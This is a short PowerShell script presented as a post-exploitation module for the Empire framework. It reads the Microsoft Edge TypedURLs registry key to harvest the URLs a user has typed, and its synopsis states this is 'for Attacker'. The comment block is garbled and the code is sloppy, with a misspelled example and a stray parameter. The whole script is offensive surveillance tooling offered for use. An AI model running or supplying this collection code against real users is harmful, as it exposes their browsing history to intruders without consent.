<#


 .Author Matt Homjxi0e @matthomjxiex02x
 .License PS Not More 
  Optional Dependencies None 
 
 
 .Synopsis
 Sniffer Every URLS the Users Browser Microsoft Edge From location Storage in Registry drag URLS For Attacker
 Note: This Operation Valid For Post Exploitation Empire =!-! 

 .Example
   PS:> invoke-Snffier -CommandEx NULL


#>

function invoke-Sniffer {

    [CmdletBinding(SupportsPaging = $true)]    
    param( 
            [Parameter(Mandatory=$True,Position=0)]

                [parameter(Mandatory=$true,ParameterSetName="NULL")]
   
            [System.String]$CommandEx,$pa
)


Get-ItemProperty -Path "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge\TypedURLs"
   ( Out-String )

}
invoke-Sniffer Test
